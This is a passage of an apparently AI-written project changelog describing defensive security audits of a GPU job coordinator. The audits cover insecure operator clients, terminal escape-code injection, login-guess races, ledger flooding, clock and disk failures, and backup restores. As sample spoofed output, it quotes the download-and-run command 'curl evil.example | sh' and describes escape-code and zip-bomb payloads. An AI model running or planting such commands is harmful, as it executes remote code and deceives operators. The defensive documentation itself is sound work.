+**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions, so this session did the ninth "code audit" pass. In 0.5.53 the *worker* learned to distrust whoever answers at the coordinator's address. But two of *your* tools also talk to the coordinator: `challenge_pool issue` (sends hidden tests, **with their correct answers**) and `rehearsal --url`. Both send the **operator token**, the master password that can queue jobs, revoke rigs and pause everything. Nobody had checked them the same way.
+
+**Found, shown really happening** (a small fake coordinator on another address of this sandbox, `192.0.2.2`, and the old code pointed at it)
+1. **Plain http to another computer was fine with it.** The fake coordinator received the operator token and the hidden test's expected answer as readable text. On a real network, anyone between you and the coordinator (café Wi-Fi, a hacked router) could read both.
+2. **A "zip bomb" reply.** The fake sent 1 MB of compressed data that unpacks to 1 GB. The tool unpacked all of it (2.2 GB of memory), then counted the test as *issued* with no job number.
+3. **A reply that never ends.** The tool kept reading until the computer killed it at about 6 GB of memory.
+4. **Fake messages on your screen.** An error message with hidden terminal codes cleared the screen, renamed the window and printed a made-up line: `Refusing: run curl evil.example | sh to fix`.
+5. **A reply nested 200,000 brackets deep** crashed it with a wall of error text.
+
+**Shipped (`operator-client-v1`)**
+- **New `app/operator_client.py`**: a drop-in client for the operator tools with the worker's rules: `https://` (or `http://` to this same machine only, unless you add `--allow-plain-http` for a home test lab), no user names or passwords in the address, never follows redirects, no compressed replies, at most 8 MB, whole reply within 60 seconds, careful JSON reading.
+- **`challenge_pool issue` / `issue-leads`**: the address is checked **before anything is sent** (the pool file isn't touched either). A test only counts as issued if the coordinator gives back a proper job number; otherwise it stays crossed off, because it may have been queued. `issue-leads` checks every rig name in the coordinator's list before sending a single test.
+- **`rehearsal --url`**: same address check and limits; a strange reply stops it with one plain sentence instead of a crash; job numbers that would be pasted into web addresses are checked first.
+- **Everything the coordinator says is printed safely** (hidden codes become `?`, long text is cut).
+- **Proof.**
+  - 72 new tests, **2,196 total: 2,195 passing, 1 skipped** on the committed tree (the one that can't work as the all-powerful root user, as designed). Full suite run on Python 3.13 and 3.11 (what CI uses).
+  - **34 of the new tests fail on the old code.** The honest path is tested end to end: tests sent from the pool and the whole two-worker rehearsal, through the new client, against a real in-process coordinator, all passing.
+  - The same fake coordinator against the new code: plain http refused before a single byte left (the fake saw nothing); zip bomb and endless reply refused (memory stayed under 60 MB); hidden codes shown as `?`; the deep reply a one-line refusal.
+  - I broke the new checks 26 ways on purpose; **24 were caught.** The 2 not caught are backup layers in the rehearsal (its summary already cleans what it prints, and its report file is JSON, which can't carry raw terminal codes). One check turned out to be doing nothing (a setting made twice), so I removed it.
+- **Honest limits:** https proves you reached *a* server with a valid certificate for that name, not that it's *your* coordinator, so keep the address right. The token still lives in your environment while the tool runs. Redirects weren't followed before either (that was already the library's default); now it's guaranteed. No coordinator is running anywhere yet, so nothing needs fixing on your side; your usual `--url http://127.0.0.1:8000` on the coordinator's own machine works exactly as before.
+
+**What you learned**
+1. **http vs https on the wire.** With `http://`, everything you send (passwords, answers) travels as readable text through every machine between you and the server. `https://` encrypts it. "localhost" / `127.0.0.1` never leaves your computer, so plain http is fine there and only there.
+2. **Your own tools are part of the attack surface.** We'd hardened the coordinator (what strangers send it) and the worker (what it receives). The operator's tools carry the most valuable secret of all, so they need the same distrust.
+3. **A "zip bomb"** is a tiny compressed file that unpacks into something enormous. The defence is simple: ask for uncompressed replies and refuse anything compressed, so there's nothing to unpack.
+4. **"Unknown" is safer than "yes".** When a reply is broken, the tool can't tell whether the test was queued. Calling it "unknown" and never reusing that test is safer than guessing "issued" (or "not sent" and sending it twice).
+
+## 2026-11-24 (21:30 UTC): A rig's answer could take over your screen (0.5.61)
+
+**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions, so this session did the tenth "code audit" pass. Earlier passes protected the worker and your network tools from what the *coordinator* says. This one looked at your read-only tools (`app.review`, `app.vouches`, `app.workers list`, `app.incident status`, `app.ledger_copy`) and asked: **who else wrote the text they print?**
+
+**Found, shown really happening** (a real ledger, built through the real API)
+1. **A rig's answer went straight to your terminal.** Terminals treat some invisible characters as commands ("escape codes"): clear the screen, move the cursor, rename the window, colour or hide text. Rig `wk-b` submitted an answer made of those codes plus a bold fake line, `Run: curl evil.example | sh`. Running `python -m app.review --all` (the list of held answers you'd look at to judge a dispute) printed it as-is: 5 escape codes in one answer. Any enrolled rig can get an answer into that list just by disagreeing with another rig. Job inputs from the submitter program went through the same way.
+2. **Someone else's ledger copy could do the same.** `ledger_copy info` printed the copy's note raw, and `ledger_copy compare` printed rig, job and event names read from the copies raw. Those files come from strangers by design (anyone can re-check a published copy).
+3. **Old ledgers.** Rig names, owner labels and pause reasons are checked when they're written (since 0.5.52), but a ledger from before then, or one edited by hand, could still hold anything, and `vouches`, `workers list` and `incident status` printed it raw.
+4. **The site and dependency checkers** quote website headers and security-advisory text written by other people.
+
+**Shipped (`operator-screen-v1`)**
+- **New `app/screen.py`:** one small module (needs nothing installed) with `say` (moved here from the worker's guard code) and `say_lines`, which prints every line of a text view with control codes and invisible marks shown as `?`. A line break hidden inside a value also becomes `?`, so it can't fake a line of the tool's own output (like a made-up `PASS`).
+- **Used by every view above.** The review queue now shows that answer as `?[2J?[H?]0;owned??[1mRun: curl evil.example | sh?[0m...`: visible, harmless, and obviously odd.
+- **Nothing lost:** `--json`, `compare --out` and the API still give the exact text, so you can see precisely what a rig sent (JSON writes the escape character as the six harmless characters `\u001b`).
+- **Proof.**
+  - 15 new tests, **2,211 total: 2,210 passing, 1 skipped** on the committed tree (the one test that can't work as the all-powerful root user, as designed). Run on Python 3.13 and 3.11 (what CI uses).
+  - **12 of the new tests fail on the old code**, including the real review command with a hostile rig.
+  - One test "poisons" every piece of text in a real review queue, vouch report and pause status at once and checks nothing harmful gets through, so a field added later is covered too.
+  - I broke the new checks 15 ways on purpose; **all 15 were caught.**
+  - Side by side on the same ledger: old code, 5 escape bytes in the output; new code, 0.
+- **Honest limits:** this covers our own text views. If you pipe `--json` into another program that decodes and prints it, that program needs the same care. Nothing needs doing on your side; no coordinator is running yet.
+
+**What you learned**
+1. **Text can be a command.** A terminal reads certain invisible characters (starting with ESC) as instructions: clear the screen, move the cursor, change the window title. Printing text from a stranger is like letting them type on your keyboard for a moment.
+2. **Ask "who wrote this?" for every line you print.** The review queue felt like a private, operator-only page, but most of what it shows (the answers) was written by rigs. "Only I can see it" isn't the same as "only I wrote it".
+3. **Show it, don't hide it.** We replace the dangerous characters with `?` instead of deleting them, so a tampered answer still *looks* tampered. Quietly cleaning it up would hide the evidence.
+4. **One choke point beats many patches.** Instead of cleaning each field, each view passes its finished lines through one function. A field someone adds next month is covered automatically, and one test can check the whole view at once.
+
+## 2026-11-24 (22:30 UTC): 230 password guesses at once, all checked (0.5.62)
+
+**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions, so this session did the eleventh "code audit" pass. Earlier passes asked "what if someone sends something nasty?". This one asked a different question: **what if someone sends many things at the same moment?**
+
+**Found, shown really happening** (a real coordinator server on this sandbox, old code)
+1. **The lock-out only counted a guess once it had been checked.** The coordinator locks an address out after 10 wrong operator or submitter tokens. But the "is this address locked out?" question is asked when a request *arrives*, and the wrong guess is only counted *after* the token has been compared. If all the guesses arrive at once, every one of them gets past the question before the first one is counted.
+2. **Real numbers:** I sent 230 wrong operator tokens over 230 connections at the same moment. **All 230 were checked** (each got "wrong token"), against a limit of 10. The only thing left holding an attacker back was the general "240 requests a minute" speed limit, so roughly 24 times more guesses than intended.
+
+**Shipped (`guess-slot-v1`)**
+- **Guess slots.** A request that carries an operator or submitter token now has to take a "slot" before its token is looked at, and gives it back when it's done (after its failure, if any, has been counted). Wrong guesses in the last 10 minutes plus slots in use can never go above 10. A request that can't get a slot is turned away with "too many login attempts at once; try again in a moment", and its token is never compared.
+- **Same test afterwards:** 230 wrong tokens at once, **exactly 10 checked**, 220 turned away.
+- **Rigs are not affected.** Their keys are long random values nobody can guess, so they don't need slots. 40 rig requests at the same moment all go through. `/health` is still never limited. You using the right token one request at a time is never slowed down (50 in a row tested).
+- **Operator health** now counts how many were turned away (`guesses_refused_at_once`).
+- **Proof.**
+  - 16 new tests, **2,227 total: 2,226 passing, 1 skipped** on the committed tree (the one test that can't work as the all-powerful root user, as designed). Run on Python 3.13 and 3.11 (what CI uses).
+  - The main tests start a real server and fire real requests at it all at once, because this kind of bug only shows up with real timing. **11 of the new tests fail on the old code**, including both bursts.
+  - I broke the new check 15 ways on purpose (forgot to count slots, off by one, never gave a slot back, removed the lock, made rigs take slots, ...); **all 15 were caught.**
+  - One older test needed one line changed: the operator health counters gained the new number.
+- **Honest limits:** like the rest of the speed limits, this lives in memory (a restart clears it). If one of your tools ever sent more than 10 operator requests at the very same moment, the extra ones would get "try again in a moment"; none of ours do (they send one at a time). No coordinator is running anywhere yet, so nothing needs doing on your side.
+
+**What you learned**
+1. **A "race condition"** is a bug that only happens when two or more things happen at the same time. Each request on its own was handled correctly; the bug was in the gap between "check" and "count".
+2. **Check-then-act needs a reservation.** Like a restaurant with 10 seats: if you only count people once they've finished eating, 230 can walk in at once. Handing out a seat at the door (the "slot") and taking it back when they leave keeps it at 10.
+3. **Some bugs only show up for real.** Ordinary tests send one request after another, so they could never see this. The new tests run a real server and fire everything at once.
+4. **Guard what's guessable.** Your operator token is something a person typed, so it's worth guessing; a rig's key is a long random number nobody can guess. Putting the strict rule only where it matters keeps it from slowing down the rigs.
+
+## 2026-11-27 (UTC): A big public ledger could stall the rigs (0.5.63)
+
+**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions, so this session did the twelfth "code audit" pass. Earlier passes asked "what if someone sends something nasty?" and "what if many things arrive at once?". This one asked: **what happens once the ledger is big, and anyone can ask to read it?**
+
+**Found, shown really happening** (a real coordinator server on this sandbox, old code, a ledger filled with 100,000 finished jobs: roughly two months of two rigs finishing one job a minute)
+1. **The public ledger page sent everything, every time.** `GET /v1/ledger` needs no password, and each reply held every result ever accepted (20 MB) and re-ran the whole "do the books add up?" check. One reply took **0.86 seconds** of the coordinator's time.
+2. **One visitor, staying inside the speed limit, stalled the rigs.** The limit is 240 requests a minute per address. Asking 4 times a second is exactly that, and it's already more work than the coordinator can do. A rig asking for its next job normally waits 4.7 ms; during the burst it waited up to **7.8 seconds**, and only 6 of the replies got out in 15 seconds (the rest piled up).
+3. **Looking up one job read the whole history.** `GET /v1/jobs/{id}` (also public) searched every event ever written to find that job's few. Small now, but it grows forever.
+
+**Shipped (`ledger-pages-v1`)**
+- **Pages.** The ledger now comes 100 results at a time (you can ask for up to 1,000), oldest first or newest first. Each reply has a `next_after` value; send it back as `after` to get the next page. The bookmark is "time accepted + job number", so two results accepted in the same second are never skipped or shown twice.
+- **The big totals once per 15 minutes.** The point totals and the "books add up" check read the whole ledger, so the public page now takes them once per 15-minute window, the same way it already does for job counts (`totals_taken_at` says when). With your operator token they are always live.
+- **Indexes** (like the index at the back of a book) so the database can jump to the right rows instead of reading them all: one for pages, one for a job's history, one for re-check lookups. Older ledgers get them automatically on start.
+- **Same server, same burst, afterwards:** each public reply **9 ms** and 20 KB instead of 0.86 s and 20 MB; the rig's waits didn't change at all (worst 8.3 ms). With 500,000 results a reply still takes only 15 ms.
+- **Proof.**
+  - 40 new tests, **2,267 total: 2,266 passing, 1 skipped** on the committed tree (the one test that can't work as the all-powerful root user, as designed). Run on Python 3.13 and 3.11 (what CI uses).
+  - **35 of the new tests fail on the old code.**
+  - Some tests ask the database itself how it plans to run the public queries and fail if it would read the whole table, so a later change can't quietly bring the slow version back.
+  - I broke the new code 19 ways on purpose (wrong page edge, bookmark ignoring the job number, indexes missing, totals live again, ...); **all 19 were caught.**
+- **Honest limits:** the first visitor in each 15-minute window still triggers one full check (about 0.4 s at 100,000 results). Your operator health page still reads everything (about 1 s at 100,000), but only you can open it. Thousands of different addresses can still flood any server: before the coordinator is public, put it behind a host with DDoS protection. No coordinator is running anywhere yet, so nothing needs doing on your side.
+
+**What you learned**
+1. **Cost per request matters as much as requests per minute.** A speed limit of 240 a minute is safe only if each request is cheap. One 0.86-second request, 4 times a second, is more work than one computer can do.
+2. **Pagination** is how big lists are served everywhere (search results, your email): a page at a time, with a bookmark for "where you left off". The bookmark has to be unique, which is why it includes the job number, not just the time.
+3. **A database index** works like the index in a book: without it, finding one job means reading every page. It costs a little disk space and makes lookups stay fast however big the ledger gets.
+4. **Bugs that only show up later.** With 10 test jobs everything was instant. The problem only appears after months of real work, which is why this pass filled a ledger with 100,000 fake rows on purpose before the rigs ever go live.
+
+## 2026-11-27 (UTC): One rig could grow the ledger forever (0.5.64)
+
+**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions, so this session did the thirteenth "code audit" pass. Last time asked "what does it cost strangers to *read* a big ledger?". This one asked the mirror question: **what can one signed-up rig make the coordinator *write*?**
+
+**Found, shown really happening** (a real coordinator server on this sandbox, old code, two rigs `wk-a` and `wk-b`)
+1. **Every refused submission was written down, every time.** When a rig sends a result the coordinator refuses (a job someone else already finished, a job given to another rig, or a "receipt" that doesn't match the job), it adds a line to the permanent audit trail. `wk-b` sent 3,000 of those at `wk-a`'s finished job: **3,000 new lines, 180 bytes each.**
+2. **That adds up.** Inside the normal speed limit (240 requests a minute) one rig can add **345,600 lines, about 62 MB, every day, forever.** It can aim them at any job, because job numbers are public and the receipt is checked before "is this your job?".
+3. **And it hurts someone else.** With one day of that piled on `wk-a`'s job, the public page for that job (`GET /v1/jobs/{id}`) was **54 MB and took 1.5 seconds** each time anyone opened it.
+4. **A slow lookup on every result.** Each time a result is accepted, the coordinator looks up that rig's record to decide how often to re-check it. That lookup read *every* result ever accepted: about 10 ms at 100,000 results, and growing.
+
+**Shipped (`refusal-log-v1`)**
+- **Written once.** The same refusal (same job, same rig, same reason) now goes into the audit trail only the first time. Repeats are just counted, in memory.
+- **Operator health shows the repeats** (`repeated_refusals`) and warns once a rig has repeated a refused submission 100 times: usually a worker stuck in a retry loop, possibly someone poking at the coordinator. You'd then look at it and revoke it if it keeps on.
+- **Nothing changes for honest rigs.** Different rigs, jobs and reasons still each get their own line. A rig re-sending its own accepted result (after a dropped reply) still gets "accepted" and writes nothing. A wrong answer on a job it holds still uses up a try each time.
+- **The public job page is capped** at 200 lines (oldest first, so the job's own story comes first) and says how many there are in all (`events_total`). The cap is done inside the database, so even an older ledger that already has a pile on one job answers quickly.
+- **New index** (like the index at the back of a book) for "this rig's results", so the per-result lookup reads only that rig's results: **10 ms → 0.2 ms** at 100,000 results.
+- **Same server, same flood, afterwards:** 3,000 refused submissions wrote **2 lines** (one per reason) and the database file didn't grow at all. The job page on an old ledger with a day's pile: 0.1 s and a few KB instead of 1.5 s and 54 MB.
+- **Reward reports:** the "bad submissions" count now counts different refusals, not repeats. The report format and points are unchanged, and reports rebuilt from older ledgers give exactly the same numbers.
+- **Proof.**
+  - 19 new tests, **2,286 total: 2,285 passing, 1 skipped** on the committed tree (the one test that can't work as the all-powerful root user, as designed). Run on Python 3.13 and 3.11 (what CI uses).
+  - One test fires 400 refused submissions at a real server (200 at the very same moment, 200 one after another) and checks that exactly 2 lines were written.
+  - **16 of the new tests fail on the old code.**
+  - I broke the new code 15 ways on purpose (skipped the "already written?" check, ignored the reason, the rig or the job in that check, stopped counting, removed the cap, showed private events, newest first, no index, warning off by one, ...); **all 15 were caught.**
+- **Honest limits:** the repeat count lives in memory (a restart clears the count, not the rule). A rig can still write one line per job and reason (at most 5 per job), once each, so a determined rig could roughly double the ledger once; revoking it stops that. The server's own log (on screen / in your host's logs) still gets one line per refused request; normal log rotation handles that. No coordinator is running anywhere yet, so nothing needs doing on your side.
+
+**What you learned**
+1. **Writes are a cost too.** Last pass was about what it costs to *read*; this one is about what someone can make you *store*. Anything a stranger can make you write down, every time they ask, is a disk that eventually fills.
+2. **Repeats aren't news.** The first refusal tells you something ("this rig sent a wrong result for job X"). The 10,000th identical one tells you only "it's still doing it", and a counter says that in one number.
+3. **One person's spam can land on someone else's page.** The flood was aimed at `wk-a`'s job, so `wk-a`'s public page got slow, not `wk-b`'s. Caps protect the people who didn't cause the problem.
+4. **Hot paths deserve indexes.** A lookup that runs on *every* accepted result has to stay fast at a million results, not just at ten. An index turned a whole-table read into a jump straight to one rig's rows.
+
+## 2026-11-27 (UTC): The coordinator trusted its own clock too much (0.5.65)
+
+**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions, so this session did the fourteenth "code audit" pass. Earlier passes asked what *other people* can do to the coordinator. This one asked: **what can the server's own clock do to it?** Everything in the ledger is filed by time: when a job was made, when a result was accepted, which reward period it counts in. And server clocks do move: the internet time service (NTP) corrects them, a virtual machine is restored from a snapshot, a small board with no clock battery boots up thinking it's 1970, 2000, or whenever it was last switched off.
+
+**Found, shown really happening**
+1. **A clock set back 3 minutes rewrote "closed" history.** (Coordinator run in-process with a clock I could move, the same way the tests do.) Period 1 was closed, its report signed and a ledger copy shared. Then the clock went back 3 minutes and the next result was filed *inside* period 1. The signed report no longer matched the ledger, and the copy-comparison tool said the operator had back-dated a job and three events. **An honest operator looked exactly like a cheating one.**
+2. **A real server started on a ledger 48 days in its future and didn't blink.** (Real uvicorn server, real clock, on this sandbox.) The ledger came from a machine whose clock was ahead; the server started and wrote a new job dated 48 days *before* the newest one already there.
+3. **A reboot in the year 2000.** With the clock reset to 2000-01-01 the coordinator started anyway, and a job a crashed rig was holding still had **27 years** left on its lease, so no other rig could ever pick it up.
+
+**Shipped (`ledger-clock-v1`)**
+- **Time never goes backwards in the ledger.** The coordinator uses the server clock or the newest time it already wrote, whichever is later. If the clock is set back, it "holds" time at the last written moment until the clock catches up. It still follows the clock *forwards*, because a board that booted on an old date has to catch up when NTP fixes it.
+- **Won't start on a clock that's clearly wrong.** More than 5 minutes (`CLOCK_BEHIND_LIMIT_SECONDS`, 300) behind the ledger and it stops with a plain message: both times in UTC, and "fix the clock (`timedatectl`, NTP) and start again". The real server from point 2 now refuses with exactly that message. A brand-new, empty ledger starts at any time.
+- **Signing a report is written down.** Before, a quiet ledger had a gap: if the last job was at 9:00 and you signed a report up to 9:15 at 9:17, nothing in the ledger said 9:17 had happened, so a restart with the clock at 9:13 could still file work inside the signed period. Now every signature (from the API or `python -m app.rewards report --sign`) adds an operator-only line to the audit trail, and its time counts.
+- **Clock jumps are noticed.** The coordinator compares the server clock with a second "steady" clock that nobody can set. If they disagree by a minute or more (`CLOCK_STEP_WARN_SECONDS`), that's a jump: it's logged, and your health page gets a new `clock` section and a warning in plain words.
+- **Your own tools follow the same rule.** Pause/resume, enroll/revoke, ledger-copy export and report signing never write an earlier time either, and refuse (writing nothing) on a clock far behind. Read-only views still work.
+- **Proof.**
+  - 22 new tests, **2,308 total: 2,307 passing, 1 skipped** on the committed tree (the one test that can't work as the all-powerful root user, as designed). Run on Python 3.13 and 3.11 (what CI uses).
+  - **17 of the new tests fail on the old code** (the other 5 test the new clock piece on its own).
+  - I broke the new code 16 ways on purpose (no holding, holding but forgetting the ledger at start, limit off by one, start check removed, signature not written down, a table left out of "newest time", set-backs not noticed, tools on the raw clock, warning switched off, ...); **all 16 were caught.**
+  - Five older tests needed a small change: their pretend ledgers are dated January 2027 and they ran the command-line tools on today's real clock, which is exactly the "clock far behind the ledger" case the new rule refuses. They now give the tools the tests' pretend clock.
+- **Honest limits:** the coordinator can't tell a *wrong* clock from a *right* one when it jumps **forwards**. If the clock leaps a day ahead for a moment, work inside that day expires (a rig gets "job expired"), and once it's set back the coordinator holds time for that day until real time catches up. You'll see a warning, but it isn't prevented. And this protects an honest operator from their own clock; it can't stop a dishonest operator from setting any clock they like (that's what shared copies and comparisons are for). No coordinator is running anywhere yet, so nothing needs doing on your side; when one does, keep NTP on.
+
+**What you learned**
+1. **A clock is an input, not a fact.** Computers set their clocks from the network and a little battery; both can be wrong. Anything that files records by time should treat the clock like any other thing that can lie.
+2. **"Monotonic" means "only goes up".** Computers have two clocks: the wall clock (the date and time, which can be changed) and a monotonic clock (a stopwatch since boot, which can't). Comparing them is how you spot that someone, or something, moved the wall clock.
+3. **Order matters more than the exact time.** For a ledger, being a few minutes off is fine; filing something *before* a line you already drew (a signed, shared period) is not. Holding time still until the clock catches up keeps the order right.
+4. **Fail loudly at start.** Refusing to start with a clear message is better than starting quietly and filing a year of work in the year 2000.
+
+## 2026-11-28 (UTC): A full disk took the whole coordinator down (0.5.66)
+
+**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions, so this session did the fifteenth "code audit" pass. Last time asked what the server's clock can do to the coordinator; this one asked the same about its **disk**: what happens when the disk under the ledger fills up? On a small box that's easy: logs, backups and one 4 GB model download share that disk.
+
+**Found, shown really happening** (old code, a real coordinator server, its ledger on a real 8 MB ext4 disk made on this sandbox, then filled to the last byte)
+1. **Everything stopped, even reading.** Claims, results, the public ledger, your operator health page and `/health` all failed with "disk I/O error". The reason is a SQLite detail: every request opens its own connection to the ledger, and when the last one closes, SQLite deletes two helper files next to the ledger (`-wal` and `-shm`). The next request has to make them again, and on a full disk it can't, so even a simple read fails.
+2. **The log blamed the wrong thing.** After the failed write, the code tried to "undo" a change SQLite had already undone, and *that* second error ("cannot rollback - no transaction is active") is what ended up in the log. You'd have gone looking for a bug instead of a full disk.
+3. **Rigs lost finished work.** A rig handing in a result got `500` (and every other request a dropped connection). The demo worker only retries when told "slow down" (`429`), so it threw the result away; the job would have been run again later by someone.
+4. **No warning first.** The operator health page said "ok" right up to the last byte.
+
+**Shipped (`storage-full-v1`)**
+- **Reads keep working on a full disk.** The ledger now keeps one idle connection open for as long as the coordinator runs, so the helper files stay. It never reads, writes or holds a lock, so it gets in nobody's way. Same full disk afterwards: `/health` answers 200, your health page answers 200, and writes politely say "try again later".
+- **The real error is the one you see.** The "undo" only runs when there's something to undo, and the first error is always the one passed on.
+- **Room is kept for results.** Under 100 MB free (`DISK_RESERVE_MB`) the coordinator stops taking **new** work: new jobs, hidden tests and enrollment codes get `503` "low on storage, try again later" and nothing is written. Rigs can still claim queued jobs and hand in results, so the queue empties instead of freezing. Free some space and it carries on by itself.
+- **Early warning.** Under 1 GB free (`DISK_WARN_MB`) your health page warns. It also has a new `storage` section: free MB, ledger size, whether new work is being taken, and how many writes failed or were refused since start. The public `/health` says nothing about the disk, so a stranger can't watch whether filling it is working.
+- **A failed save is "try again later", not a crash.** If a write still fails because the disk is full or failing, the rig gets `503` with "come back in 60 s" (nothing half-written), it's counted on your health page, and the log line says so without the error's text (which can contain file paths). Any other database error is still treated as a real error.
+- **The worker keeps its result.** `demo_worker.py` now waits and retries a result after `503` (up to 5 tries), and when asking for work gets `503` it prints the coordinator's reason.
+- **Proof.**
+  - Same real disk, new code: result `503` while full, then `200` for the very same result once space was freed; new jobs refused while low; health 200 throughout; ledger self-check clean.
+  - 41 new tests, **2,349 total: 2,348 passing, 1 skipped** on the committed tree (the one test that can't work as the all-powerful root user, as designed). Run on Python 3.13 and 3.11 (what CI uses).
+  - **20 of the new tests fail on the old code.** Two of them run a coordinator in a separate process that isn't allowed to write past 16 KB in any file (a real "can't write" condition, no special permissions needed, so it runs in CI too): with the idle connection, reads answer 200 and writes 503; without it, even `/health` fails, exactly like the real disk.
+  - I broke the new code 17 ways on purpose (no idle connection, old undo, reserve off by one, each of the three "new work" routes left open, I/O errors not counted, worker not retrying, free space read from the wrong folder, error text logged, every database error turned into 503, ...); **all 17 were caught.**
+- **Honest limits:** if something else (logs, a model download) fills the disk to zero, writes still have to wait until someone frees space. Nothing is lost or half-written and rigs are told to come back, but the coordinator doesn't delete anything for you. Keeping model files on a different disk from the ledger avoids most of it. No coordinator is running anywhere yet, so nothing needs doing on your side (there's a "good to know" line in USER_TODO).
+
+**What you learned**
+1. **"Full" isn't only a write problem.** You'd expect a full disk to stop *saving*. Here it stopped *reading* too, because the database needed to create a small helper file just to look. Small hidden writes are everywhere.
+2. **The first error is the one that matters.** When cleanup code fails after the real failure, its error can replace the real one in the log. Good error handling makes sure the original reason survives.
+3. **Keep a reserve.** A petrol tank's warning light comes on before it's empty. Refusing new work at 100 MB, while still accepting results, keeps the last bit of room for the things that are already paid for in effort.
+4. **"Try again later" is a feature.** A `503` with `Retry-After` tells a rig "not your fault, come back in a minute"; a `500` says "something broke". Picking the right answer lets the worker keep its finished result.
+
+## 2026-11-28 (UTC): Putting an old copy of the ledger back undid security decisions (0.5.67)
+
+**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions, so this session did the sixteenth "code audit" pass. The last two asked what the server's clock and disk can do to the coordinator. This one asked: **what happens when the ledger is restored from a backup?** Disks die and people make mistakes, so one day an older copy of the ledger *will* be put back. Until now there was no backup tool at all, so I tried the ways a person would naturally do it.
+
+**Found, shown really happening** (old code, on this sandbox)
+1. **A plain copy of the running ledger was empty.** `cp ledger.sqlite3 backup.sqlite3` while the coordinator ran gave a file with **no rigs and no jobs** in it, and it opened without any error. SQLite writes new things to a side file (`-wal`) first and only folds them into the main file later; `cp` only took the main file.
+2. **SQLite's own backup command made a copy anyone on the machine could read.** The ledger holds the answer to every hidden test.
+3. **The obvious restore after a crash broke the ledger.** A crash leaves the `-wal` side file behind. Copying the backup over the ledger and starting again made SQLite replay that old side file into the backup: "database disk image is malformed".
+4. **Even a correct restore undid your decisions.** On a real coordinator (in-process): a rig revoked after the backup **logged in again**; an enrollment code already used after the backup **registered a second rig**; the notes that said "these hidden tests were shared in a ledger copy" and "this period was signed" were gone (so a revealed test could be reused, and new work filed inside a signed period); and a pause for an incident was lifted.
+
+**Shipped (`backup-restore-v1`)**
+- **`python -m app.backup make --out <file>`**: a consistent snapshot while the coordinator keeps running (SQLite's backup API, which includes the side file), owner-only from the first byte, one self-contained file, checked before it gets its real name. It never overwrites anything.
+- **`python -m app.backup check <file>`**: is this backup safe to put back? Owner-only, not damaged, and nothing in it but the ledger's own tables. A hidden trigger or view is refused: after a restore it would run *inside* your coordinator (a trigger could, say, copy hidden-test answers somewhere public).
+- **`python -m app.backup restore <file>`**: first a dry run that changes nothing and lists what would be lost (results per rig, rigs that must enroll again, signed reports that count work the backup doesn't have). With `--yes` it:
+  - only runs when **nothing else has the ledger open**. The coordinator and every operator tool now hold a shared "I'm using this" lock; the restore needs the exclusive one, and nothing can open the ledger while it runs;
+  - folds the old ledger's side file into it first, so nothing stale gets replayed;
+  - **carries forward what must never be undone**: revocations, the "shared copy" and "signed" notes (with their original times) and a pause;
+  - **cancels every enrollment code that was still unused** in the backup (some were used after it; you make new ones);
+  - writes down that a restore happened (which backup, what was carried, what was lost) and **keeps the old ledger** next to it, owner-only.
+- **Proof.**
+  - Same story on the new code: the revoked rig is refused (`403`), the used code is refused, the restore was refused while the coordinator was running.
+  - 33 new tests, **2,382 total: 2,381 passing, 1 skipped** on the committed tree (the one test that can't work as the all-powerful root user, as designed). Run on Python 3.13 and 3.11 (what CI uses). Four of the new tests replay the old ways failing (empty `cp`, readable SQLite backup, "malformed" after a crash, revoked rig back in); one runs a real crash in a separate process.
+  - I broke the new code 17 ways on purpose (backup readable by others, left with a side file, plain file copy, tamper check off, revocations / notes / pause not carried, codes not cancelled, old side file not folded in, no lock in the coordinator or the restore, clock rule ignored, old ledger deleted, restore not written down, ...); **all 17 were caught.**
+- **Honest limits:** work accepted after the backup is gone from the restored ledger. The tool tells you how much, per rig, and keeps the replaced ledger so you can look. Rigs that joined after the backup have to enroll again. If the old ledger is gone too (a dead disk), nothing can be carried forward: the tool warns, cancels unused codes, and you'd revoke any bad rig again and check `reports/` for periods you already signed. The "in use" lock works on one Linux or Mac machine, not on Windows or a network drive. No coordinator is running anywhere yet, so nothing needs doing on your side (there's a "good to know" line in USER_TODO).
+
+**What you learned**
+1. **A database is more than one file.** SQLite keeps recent changes in a side file (`-wal`). Copy only the main file and you copy the past; leave an old side file next to a different main file and you get a broken database. Use the database's own backup method.
+2. **A backup is as secret as the original.** It holds every hidden-test answer and key fingerprint, so it needs the same "only me" permissions, and encryption before it leaves the machine.
+3. **Rolling back data can roll back decisions.** "Revoked", "already used", "already published" and "paused" are promises you made to the outside world. Restoring old data must not quietly take them back, so the restore copies them forward.
+4. **Don't change a file someone else has open.** The "in use" lock is how the restore knows the coordinator is really stopped, instead of trusting that it is.
+
+## 2026-11-28 (UTC): Older code ran on a newer ledger without a word (0.5.68)
+
+**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions, so this session did the seventeenth "code audit" pass. Last time asked what a restore from a backup can undo. This one asked the same about the **code**: what happens when the ledger and the coordinator come from **different versions**? That happens on every upgrade, and on every rollback ("the new version has a bug, put the old one back"), which is the first thing anyone does after a bad update.
+
+**Found, shown really happening** (on this sandbox, a ledger written by today's code, then opened by older versions of this repo checked out from its own history)
+1. **Older code skipped newer rules, silently.** The coordinator from before aimed hidden tests (commit `974ff33`) opened the ledger without a word, gave a hidden test aimed at rig A to rig B, and took new work during an incident pause. The one from just before the pause was added (`3a9bef3`) also took new work during the pause. The 0.5.65 code doesn't take the "in use" lock from last session, so a restore ran while it was still running. None of them could know: nothing in the file said which version wrote it.
+2. **Today's code would do the same to a future ledger.** A ledger with one extra rule from a later version (a column today's code has never heard of) opened as if it weren't there.
